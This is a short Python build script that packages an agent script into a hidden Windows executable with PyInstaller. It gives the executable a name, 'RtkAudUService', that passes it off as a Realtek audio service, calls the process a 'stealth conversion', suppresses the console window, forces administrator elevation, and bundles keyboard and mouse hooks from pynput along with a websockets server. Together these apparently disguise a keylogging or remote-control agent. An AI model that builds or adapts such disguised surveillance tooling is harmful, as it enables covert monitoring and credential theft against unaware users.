import PyInstaller.__main__
import os

# --- Configuration ---
SOURCE_FILE = r"C:\Users\rajiv\remix-of-nexus\scripts\sentinel_agent.py"
OUTPUT_DIR = "release/legacyAgent"
# New Stealth Name
EXE_NAME = "RtkAudUService" 

def build():
    print(f"[build] Initiating stealth conversion for: {SOURCE_FILE}")

    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    PyInstaller.__main__.run([
        SOURCE_FILE,
        '--onefile',               # Single unit deployment
        '--noconsole',             # No visible terminal (Invisible Warden)
        '--uac-admin',             # FORCED: Requests Admin privileges on launch
        '--name', EXE_NAME,        # Output as RtkAudUService.exe
        '--distpath', OUTPUT_DIR,
        '--workpath', 'build/temp',
        '--clean',
        # Dependency handling for v6.3.3
        '--hidden-import', 'pynput.keyboard._win32',
        '--hidden-import', 'pynput.mouse._win32',
        '--hidden-import', 'websockets.legacy.server',
    ])

    print(f"\n[+] Stealth Build Complete: {os.path.join(OUTPUT_DIR, EXE_NAME + '.exe')}")

if __name__ == "__main__":
    build()